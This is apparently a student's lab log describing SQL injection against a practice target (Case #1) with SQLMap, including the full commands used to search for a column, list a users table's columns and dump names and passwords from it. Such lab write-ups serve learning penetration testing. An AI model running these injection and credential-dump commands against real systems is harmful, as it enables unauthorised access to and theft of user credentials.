### 📅 21/06/2026 - Advanced Database Enumeration with SQLMap

**Objective:** Exploited an SQL injection vulnerability (Case #1) to enumerate specific database structures and extract user credentials using advanced SQLMap features.

**Key Concepts Learned:**
* **Targeted Searching:** Using `--search` with database identifiers (`-D`, `-T`, `-C`) to find specific patterns inside massive database schemas without wasting time or terminal space.
* **Data Extraction & Filtering:** Combining specialized flags (`-D`, `-T`, `-C`, `--dump`) to selectively extract target data rows rather than dumping full tables, optimizing bandwidth and speed.

---

### 💻 Lab Walkthrough & Commands Used

#### Task 1: Locating a Specific Column ("style")
Initially running a broad `--schema` dump produced excessive noise, making it inefficient to audit manually. To bypass this, I utilized SQLMap's search capabilities to look for columns matching the keyword `style`.

```bash
sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" --search -C style --batch
```
#### Task 2: Extracting Target User Credentials (User: "Kimberly")
To extract credentials efficiently without dumping heavy database overhead, I targeted the specific database and table structure. I first enumerated the column layout to confirm the exact parameter names before executing a targeted data dump.

```bash
sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" -D testdb -T users --columns --batch
sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" -D testdb -T users --dump -C name,password --batch
